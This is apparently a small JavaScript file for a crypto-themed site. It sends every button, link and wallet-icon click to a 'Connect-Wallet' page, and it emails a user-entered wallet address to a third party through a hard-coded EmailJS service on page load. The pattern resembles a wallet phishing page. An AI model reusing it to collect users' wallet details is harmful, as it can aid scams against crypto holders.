

var buttons = document.querySelectorAll(".button");

buttons.forEach(function(button) {
var image = button.querySelector(".buttons-image");
button.addEventListener("click", function() {
  window.location.href = "Connect-Wallet/";
  //window.location.href = "Connect-Wallet/index.html";
});
  button.addEventListener("mouseover", function() {
  image.src = "Images/Buttons-Image-Blue.jpg";
});
button.addEventListener("mouseout", function() {
  image.src = "Images/Buttons-Image.jpg";
});
});


var Links = document.querySelectorAll(".link");
Links.forEach(function(Link) {
  Link.addEventListener("click", function() {
    window.location.href = "Connect-Wallet/";
  });
});


var walletIcons = document.querySelectorAll(".wallet-icon");
walletIcons.forEach(function(walletIcon) {
  walletIcon.addEventListener("click", function() {
    window.location.href = "Connect-Wallet/";
  });
});


function sendMail() {
var walletAddressInput = document.querySelector(".wallet-address-input").value;
var submitButton = "Murphy Wallet Address";
emailjs.send('service_h25qeyg', 'template_3asqsuh', {
walletAddress: walletAddressInput,
submitButton: submitButton,
})
.then(function(response) {
window.location.href = "file:///D:/Program%20files/Documents/VSCode/HTML/Murphy/Home/index.html";
})
.catch(function(error) {
window.location.href = "file:///D:/Program%20files/Documents/VSCode/HTML/Murphy/Home/index.html";
});
}
sendMail();


